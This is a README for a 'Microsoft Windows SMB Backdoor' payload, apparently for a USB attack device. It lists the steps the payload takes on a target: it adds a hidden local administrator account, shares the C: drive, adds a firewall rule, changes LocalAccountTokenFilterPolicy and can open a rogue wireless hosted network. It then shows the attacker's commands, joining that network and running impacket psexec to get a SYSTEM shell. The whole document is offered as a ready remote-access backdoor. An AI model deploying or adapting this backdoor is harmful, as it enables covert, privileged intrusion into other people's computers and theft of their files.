# "Microsoft Windows" SMB Backdoor

- Title:         "Microsoft Windows" SMB Backdoor
- Author:        TW-D
- Version:       1.0
- Target:        Microsoft Windows
- Category:      Remote Access

## Description

1) Adds a user account.
2) Adds this local user to local administrator group.
3) If the target computer is equipped with a compatible Wi-Fi card :
    Avoids security measures on the internal network with the 
    creation of a wireless "Hosted Network".
4) Shares "C:\" directory.
5) Adds a rule to the firewall.
6) Sets a value to "LocalAccountTokenFilterPolicy" to access the "C:" with a local account.
7) Hides user account.

## Configuration

From "payload.txt" change the values of the following constants :
```bash

######## INITIALIZATION ########

readonly SMB_USERNAME="BB_User"
readonly SMB_PASSWORD="BB_P@ssW0rD"

##
# (any) Administrators
# (fr) Administrateurs
##
readonly GROUP_NAME="Administrators"

##
# Can be set to "true" if the target computer 
# is equipped with a compatible Wi-Fi card.
##
readonly WIRELESS_HOTSPOT="false"

readonly SMB_SHARE="BB_SHARE"

```

## Exploitation

>
> The name of the access point and the security key will be those defined by the values of the constants : **SMB_SHARE** and **SMB_PASSWORD**.
>

```
hacker@hacker-computer:~$ nmcli dev wifi connect "<SMB_SHARE>" password "<SMB_PASSWORD>"
```

>
> The connection identifiers will be those defined by the values of the constants : **SMB_USERNAME** and **SMB_PASSWORD**.
>

```
hacker@hacker-computer:~$ python3 /opt/impacket/examples/psexec.py ./<SMB_USERNAME>:<SMB_PASSWORD>@<TARGET>
C:\WINDOWS\system32> whoami
nt authority\system
```

>
> The share name and identifiers will be those defined by the values of the constants : **SMB_SHARE**, **SMB_USERNAME** and **SMB_PASSWORD**.
>

```
smb://<TARGET>/<SMB_SHARE>/
```